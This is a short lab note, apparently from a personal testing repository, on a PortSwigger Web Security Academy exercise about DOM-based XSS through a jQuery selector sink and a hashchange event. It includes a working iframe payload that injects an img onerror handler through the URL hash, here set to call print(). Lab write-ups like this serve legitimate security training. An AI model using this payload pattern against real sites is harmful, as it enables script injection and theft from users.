**DOM XSS in jQuery selector sink using a hashchange event**

Notice jquery from prefix $
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/78080d96-5c70-4184-9b4e-407e3de51ab1)





Hashchange spotted which uses # to bookmark
 
`https://exploit-0a81005a04487a538017161c010b00ad.exploit-server.net/exploit`


```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

From <https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event> 


Will pop up a print 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2349ae3e-8e6b-4471-ac1e-e7e045c44bb6)


